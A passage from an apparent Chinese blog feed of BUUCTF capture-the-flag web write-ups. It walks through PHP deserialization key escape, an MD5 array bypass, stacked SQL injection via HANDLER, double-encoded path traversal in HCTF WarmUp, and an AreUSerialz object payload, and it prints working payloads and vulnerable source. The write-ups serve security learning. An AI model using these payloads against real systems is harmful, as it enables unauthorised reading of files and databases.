<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#125;else if($function &#x3D;&#x3D; &#39;phpinfo&#39;)&#123;</span><br><span class="line">  eval(&#39;phpinfo();&#39;); &#x2F;&#x2F;maybe you can find something in here!</span><br></pre></td></tr></table></figure>

<p>顺着提示，赋值f=phpinfo进行查询。</p>
<p><img src="/2021/08/19/buu/14/image-20210819094711265.png"></p>
<p>找到了d0g3_f1ag.php，猜测flag在其中</p>
<p>接下来代码审计</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$img</span>)</span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    $filter = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,$filter_arr).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">&#x27;&#x27;</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br></pre></td></tr></table></figure>

<p>filter函数是为了过滤用的</p>
<p>过滤了很多关键字，比如php，flag，若遇到会正则替换为空</p>
<p>之后还会序列化，所以我们要反序列化操作一手</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">$_SESSION[<span class="string">&#x27;function&#x27;</span>] = $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br></pre></td></tr></table></figure>

<p>我萌发现unset函数将$_SESSION销毁了</p>
<p>然后重新赋予$_SESSION了新的值。</p>
<p>最后调用了extract($_POST);</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">extract() 函数从数组中将变量导入到当前的符号表。</span><br></pre></td></tr></table></figure>

<h5 id="举例extract-变量覆盖"><a href="#举例extract-变量覆盖" class="headerlink" title="举例extract()变量覆盖"></a>举例extract()变量覆盖</h5><p>根据extract()我们可以进行变量覆盖，</p>
<p>当我们传入SESSION[flag]=123时，$SESSION[“user”]和$SESSION[‘function’] 全部会消失。</p>
<p>只剩下_SESSION[flag]=123。</p>
<p><img src="/2021/08/19/buu/14/1947190-20200419170914367-953947353.png" alt="img"></p>
<h6 id="键值逃逸"><a href="#键值逃逸" class="headerlink" title="键值逃逸"></a>键值逃逸</h6><p>原理:因为序列化后的字符串是严格的，对应的格式不能错，比如s:4:”name”,那s:4就必须有一个字符串长度是4的否则就往后截取</p>
<p>并且unserialize会把多余的字符串当垃圾处理，在花括号内的就是正确的，花括号后面的就都被扔掉。</p>
<p>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#正规序列化的字符串</span></span><br><span class="line">$a = <span class="string">&quot;a:2:&#123;s:3:\&quot;one\&quot;;s:4:\&quot;flag\&quot;;s:3:\&quot;two\&quot;;s:4:\&quot;test\&quot;;&#125;&quot;</span>;</span><br><span class="line">var_dump(unserialize($a));</span><br><span class="line"><span class="comment">#带有多余的字符的字符串</span></span><br><span class="line">$a_laji = <span class="string">&quot;a:2:&#123;s:3:\&quot;one\&quot;;s:4:\&quot;flag\&quot;;s:3:\&quot;two\&quot;;s:4:\&quot;test\&quot;;&#125;;s:3:\&quot;真的垃圾img\&quot;;lajilaji&quot;</span>;</span><br><span class="line">var_dump(unserialize($a_laji));</span><br></pre></td></tr></table></figure>

<p>有了这个逃逸概念的话，就大概可以理解了。</p>
<p>如果我们把$_SESSION[‘img’] = base64_encode(‘guest_img.png’);这段代码的img属性放到花括号外边去</p>
<p>然后花括号中注好新的img属性，那么他本来要求的img属性就被咱们替换了。</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_SESSION[phpflag]&#x3D;;s:7:&quot;xxxxxxx&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_SESSION[phpflag]&#x3D;;s:14:&quot;phpflagphpflag&quot;;s:7:&quot;xxxxxxx&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/08/19/buu/14/image-20210819210654326.png" alt="image-20210819210654326"></p>
<p><img src="/2021/08/19/buu/14/image-20210819210523566.png" alt="image-20210819210523566"></p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>MRCTF2020 Ez_bypass&amp;GYCTF2020 Blacklist</title>
    <url>/2021/07/27/buu/3/</url>
    <content><![CDATA[<h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p>打开靶机：</p>
<p><img src="/2021/07/27/buu/3/image-20210727172208110.png" alt="image-20210727172208110"></p>
<p>按照提示</p>
<p>进入f12中</p>
<p><img src="/2021/07/27/buu/3/image-20210727172249158.png" alt="image-20210727172249158"></p>
<p>代码审计一下：</p>
<p>里面包含了名为flag.php的文件，flag的格式也进行了说明</p>
<p>接下来要处理两个变量，gg和id</p>
<p>第一个if判断的是两个变量md5值相同但是其本身却不能相等</p>
<p>我查找到了有关资料</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MD5不能处理数组，处理任意数组返回值都相同</span><br></pre></td></tr></table></figure>

<p>所以我们直接这样赋值</p>
<p>?id[]=1&amp;gg[]=2</p>
<p>成功达成第一个条件：</p>
<p><img src="/2021/07/27/buu/3/image-20210727172710626.png" alt="image-20210727172710626"></p>
<p>接着看看第二个if需要完成什么</p>
<p>提示我们POST传参passwd变量</p>
<p>其值不能为数字型</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;是恒等计算符  同时检查表达式的值与类型</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;是比较运算符号  不会检查条件式的表达式的类型</span><br></pre></td></tr></table></figure>

<p>之后的比较同样满足条件。思路有了，</p>
<p>不过我做法错了，跟以前弱口令什么的混起来了，疯狂尝试了‘123456a’无果</p>
<p>看了wp后才知道，其实不用加分号，直接passwd=1234567a，这里已经是字符型了。</p>
<p>一剑封喉：</p>
<p><img src="/2021/07/27/buu/3/image-20210727173223649.png" alt="image-20210727173223649"></p>
<h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p>打开靶机后，明显注入题。</p>
<p><img src="/2021/07/27/buu/3/image-20210727204621570.png" alt="image-20210727204621570"></p>
<p>wp来源：<a href="https://www.cnblogs.com/20175211lyz/p/12356678.html">https://www.cnblogs.com/20175211lyz/p/12356678.html</a></p>
<h4 id="姿势-堆叠注入"><a href="#姿势-堆叠注入" class="headerlink" title="姿势-堆叠注入"></a>姿势-堆叠注入</h4><p>获取库名、表名、列名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show databases;</span><br><span class="line">show tables;</span><br><span class="line">show columns from &#96;table_name&#96;;</span><br></pre></td></tr></table></figure>

<p>试着查询了一下数据库名、表名和段名（<strong>这里没有用之前传统的联合查询，因为自己尝试查询之后发现后面会被正则表达式过滤</strong>）：</p>
<p>ps：不过我不太清楚为什么这里查询要 ‘ 加上 ；</p>
<p><img src="/2021/07/27/buu/3/image-20210727204959368.png" alt="image-20210727204959368"></p>
<p><img src="/2021/07/27/buu/3/image-20210727205248791.png" alt="image-20210727205248791"></p>
<p>出现了flag字样，然后用大佬的方法，</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#</span><br></pre></td></tr></table></figure>

<p>官方解释是：</p>
<p>HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，</p>
<p>该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭</p>
<h4 id="Tip："><a href="#Tip：" class="headerlink" title="Tip："></a>Tip：</h4><p>本来应该还有一种姿势是修改表名，但是修改表名的关键字rename和alert都被正则ban掉，所以不能用</p>
<p>这题若是改造之前的强网杯2019随便注一题则可以用此方法。</p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>HCTF 2018 WarmUp</title>
    <url>/2021/08/29/buu/15/</url>
    <content><![CDATA[<p> 重新回顾了下这题</p>
<p><img src="/2021/08/29/buu/15/image-20210829094805908.png" alt="image-20210829094805908"></p>
<p>F12查看到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;$page</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>代码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p> 高亮显示文件函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;$page</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>checkfile函数里（），提示我们source.php和hint.php</p>
<p>访问hint.php得到语句：</p>
<p><strong>flag not here, and flag in ffffllllaaaagggg</strong></p>
<p>将传递的参数赋值给page，然后判断若page变量不存在或非字符串</p>
<p>则echo  “you can’t see it”</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;$_page = mb_substr(</span><br><span class="line">    $page,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    mb_strpos($page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>若变量page存在于whitelist数组中</p>
<p>则返回true</p>
<p>以下看几个php函数：</p>
<p>php in_array函数</p>
<p>定义和用法：</p>
<p>in_array()函数搜索数组中是否存在指定的值</p>
<p><strong>注释：</strong>如果search参数是字符串并且设置为true，则搜索区分大小写</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">in_array(search,array,type)</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><em>search</em></td>
<td align="left">必需。规定要在数组搜索的值。</td>
</tr>
<tr>
<td align="left"><em>array</em></td>
<td align="left">必需。规定要搜索的数组。</td>
</tr>
<tr>
<td align="left"><em>type</em></td>
<td align="left">可选。如果设置该参数为 true，则检查搜索的数据与数组的值的类型是否相同。</td>
</tr>
</tbody></table>
<p>php mb_substr()函数</p>
<p>mb_substr() 函数返回字符串的一部分，之前我们学过 substr() 函数，它只针对英文字符，如果要分割的中文文字则需要使用 mb_substr()。</p>
<p><strong>注释：</strong>如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mb_substr ( string $str , int $start [, int $length &#x3D; NULL [, string $encoding &#x3D; mb_internal_encoding() ]] ) : string</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><em>str</em></td>
<td align="left">必需。从该 string 中提取子字符串。</td>
</tr>
<tr>
<td align="left"><em>start</em></td>
<td align="left">必需。规定在字符串的何处开始。正数 - 在字符串的指定位置开始负数 - 在从字符串结尾的指定位置开始0 - 在字符串中的第一个字符处开始</td>
</tr>
<tr>
<td align="left"><em>length</em></td>
<td align="left">可选。规定要返回的字符串长度。默认是直到字符串的结尾。正数 - 从 start 参数所在的位置返回负数 - 从字符串末端返回</td>
</tr>
<tr>
<td align="left">encoding</td>
<td align="left">可选。字符编码。如果省略，则使用内部字符编码。</td>
</tr>
</tbody></table>
<p>php mb_strpos函数</p>
<p>定义和用法：</p>
<p>查找字符串在另一个字符串首次出现的位置</p>
<p>基于字符数执行一个多字节安全的strpos()操作，第一个字符的位置是0，第二个字符的位置是1，依次类推</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strpos(*string,find,start*)</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><em>string</em></td>
<td align="left">必需。规定被搜索的字符串。</td>
</tr>
<tr>
<td align="left"><em>find</em></td>
<td align="left">必需。规定要查找的字符。</td>
</tr>
<tr>
<td align="left"><em>start</em></td>
<td align="left">可选。规定开始搜索的位置。</td>
</tr>
</tbody></table>
<p>我们大概就可以知道了，这段代码表示截取$page中’?’前部分，若无则截取整个$page</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$_page = urldecode($page);</span><br></pre></td></tr></table></figure>

<p>这里是对page进行url解码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>这里首先判断$_REQUEST[‘file’]值非空</p>
<p>第二判断是否为字符串</p>
<p>再就是能否通过checkfile（）函数校验</p>
<p>后面是包含$_REQUEST[‘file’]文件</p>
<p>如果条件不满足就打印滑稽表情</p>
<p>结论：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.第一个&#96;&#96;if&#96;&#96;语句对变量进行检验，要求&#96;&#96;$page&#96;&#96;为字符串，否则返回false</span><br><span class="line">2.第二个&#96;&#96;if&#96;&#96;语句判断&#96;&#96;$page&#96;&#96;是否存在于&#96;&#96;$whitelist&#96;&#96;数组中，存在则返回true</span><br><span class="line">3.第三个&#96;&#96;if&#96;&#96;语句判断截取后的&#96;&#96;$page&#96;&#96;是否存在于&#96;&#96;$whitelist&#96;&#96;数组中，截取&#96;&#96;$page&#96;&#96;中&#96;&#96;&#39;?&#39;&#96;&#96;前部分，存在则返回true</span><br><span class="line">4.第四个&#96;&#96;if&#96;&#96;语句判断url解码并截取后的&#96;&#96;$page&#96;&#96;是否存在于&#96;&#96;$whitelist&#96;&#96;中，存在则返回true</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">若以上四个&#96;&#96;if&#96;&#96;语句均未返回值，则返回false</span><br><span class="line">有三个&#96;&#96;if&#96;&#96;语句可以返回true，第二个语句直接判断&#96;&#96;$page&#96;&#96;，不可用</span><br><span class="line">第三个语句截取&#96;&#96;&#39;?&#39;&#96;&#96;前部分，由于?被后部分被解析为get方式提交的参数，也不可利用</span><br><span class="line">第四个&#96;&#96;if&#96;&#96;语句中，先进行url解码再截取，因此我们可以将?经过两次url编码，在服务器端提取参数时解码一次，checkFile函数中解码一次，仍会解码为&#96;&#96;&#39;?&#39;&#96;&#96;，仍可通过第四个&#96;&#96;if&#96;&#96;语句校验。（&#96;&#96;&#39;?&#39;&#96;&#96;两次编码值为&#96;&#96;&#39;%253f&#39;&#96;&#96;）,构造url：</span><br></pre></td></tr></table></figure>

<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">source.php?file&#x3D;hint.php%253F..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">source.php?file&#x3D;source.php%253F..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure>

<p>hint.php和source.php都是白名单里文件</p>
<p>因为我们不知道ffffllllaaaagggg文件存放的具体位置<br>所以可以依次增加   ../</p>
<p>最后拿到flag</p>
<p><img src="/2021/08/29/buu/15/image-20210829101454490.png" alt="image-20210829101454490"></p>
<p>借鉴于：</p>
<p>[<a href="https://www.cnblogs.com/R-S-PY/p/12095264.html">HCTF 2018]WarmUp - AlexANSO - 博客园 (cnblogs.com)</a></p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>网鼎杯 2020 青龙组AreUSerialz</title>
    <url>/2021/07/26/buu/2/</url>
    <content><![CDATA[<p>​    打开后，出现代码页面</p>
<p><img src="/2021/07/26/buu/2/image-20210726194801767.png" alt="image-20210726194801767"></p>
<p>​    处理到vs上</p>
<p><img src="/2021/07/26/buu/2/image-20210726194850909.png" alt="image-20210726194850909"></p>
<p>接着我们逐段分析：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">include(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure>

<p>​    包含了名为flag.php的文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">protected $op;</span><br><span class="line"></span><br><span class="line">protected $filename;</span><br><span class="line"></span><br><span class="line">protected $content;</span><br></pre></td></tr></table></figure>

<p>​    受保护方法的三个变量</p>
<p>接下来是借鉴了大佬博客</p>
<p>经过分析，这个题目需要传入一个序列化之后的类对象（因为最后的valid函数会进行一步反序列化），并且要绕过两层防护：</p>
<p>两个防护：<br><strong>is_valid()</strong><br>要求我们传入的str的每个字母的ascii值在32和125之间。因为protected属性在序列化之后会出现不可见字符\00*\00，不符合上面的要求。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function is_valid($s) &#123;</span><br><span class="line"></span><br><span class="line">  for($i &#x3D; 0; $i &lt; strlen($s); $i++)</span><br><span class="line"></span><br><span class="line">​    if(!(ord($s[$i]) &gt;&#x3D; 32 &amp;&amp; ord($s[$i]) &lt;&#x3D; 125))</span><br><span class="line"></span><br><span class="line">​      return false;</span><br><span class="line"></span><br><span class="line">  return true;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里用到了python的ord函数：</p>
<p>[^]: ord () 函数是 chr () 函数（对于8位的ASCII字符串）或 unichr () 函数（对于Unicode对象）的配对函数，它以一个字符（长度为1的字符串）作为参数，返回对应的 ASCII 数值，或者 Unicode 数值</p>
<p>绕过方法：因为php7.1以上的版本对属性类型不敏感，所以可以将属性改为public，public属性序列化不会出现不可见字符</p>
<p><strong>destruct()魔术方法</strong><br>op===”2”，是强比较，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function __destruct() &#123;</span><br><span class="line">        if($this-&gt;op &#x3D;&#x3D;&#x3D; &quot;2&quot;)</span><br><span class="line">            $this-&gt;op &#x3D; &quot;1&quot;;</span><br><span class="line">        $this-&gt;content &#x3D; &quot;&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p> <strong>而在process()函数中,</strong></p>
<p>op==”2”是弱比较</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public function process() &#123;</span><br><span class="line">        if($this-&gt;op &#x3D;&#x3D; &quot;1&quot;) &#123;</span><br><span class="line">            $this-&gt;write();</span><br><span class="line">        &#125; else if($this-&gt;op &#x3D;&#x3D; &quot;2&quot;) &#123;</span><br><span class="line">            $res &#x3D; $this-&gt;read();</span><br><span class="line">            $this-&gt;output($res);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Bad Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>


<p> 绕过方法：可以使传入的op是数字2，从而使第一个强比较返回false,而使第二个弱比较返回true.</p>
<p><img src="/2021/07/26/buu/2/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JBQkNEWEI=,size_16,color_FFFFFF,t_70" alt="img"></p>
<p>绕过之后，就是到了关键一步，要进行本地序列化操作：</p>
<p>我直接照搬了大佬的文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class FileHandler &#123;</span><br><span class="line"></span><br><span class="line">    public  $op &#x3D; 2;</span><br><span class="line">    public  $filename &#x3D; &quot;flag.php&quot;;</span><br><span class="line">    public  $content &#x3D; &quot;1&quot;;        &#x2F;&#x2F;因为destruce函数会将content改为空，所以content的值随意（但是要满足is_valid()函数的要求）</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new FileHandler();</span><br><span class="line">$b &#x3D; serialize($a);</span><br><span class="line">echo $b;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>访问xu.php</p>
<p><img src="/2021/07/26/buu/2/image-20210726200434420.png" alt="image-20210726200434420"></p>
<p>​        构建payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?str&#x3D;O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:1:&quot;1&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>​        F12得到flag：</p>
<p><img src="/2021/07/26/buu/2/image-20210726200827967.png" alt="image-20210726200827967"></p>
<p>本文借鉴于：[<a href="https://blog.csdn.net/RABCDXB/article/details/114297291">网鼎杯 2020 青龙组]AreUSerialz_RABCDXB的博客-CSDN博客</a></p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>CISCN 2019 初赛	Love Math</title>
    <url>/2021/07/30/buu/4/</url>
    <content><![CDATA[<p>​    这是一道非常好的绕过题目。</p>
<p><img src="/2021/07/30/buu/4/image-20210730151757624.png" alt="image-20210730151757624"></p>
<p>附上源码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">&#x2F;&#x2F;听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="line">if(!isset($_GET[&#39;c&#39;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    &#x2F;&#x2F;例子 c&#x3D;20-1</span><br><span class="line">    $content &#x3D; $_GET[&#39;c&#39;];</span><br><span class="line">    if (strlen($content) &gt;&#x3D; 80) &#123;</span><br><span class="line">        die(&quot;太长了不会算&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;];</span><br><span class="line">    foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">        if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $content)) &#123;</span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的字符&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;常用数学函数http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;php&#x2F;php_ref_math.asp</span><br><span class="line">    $whitelist &#x3D; [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];</span><br><span class="line">    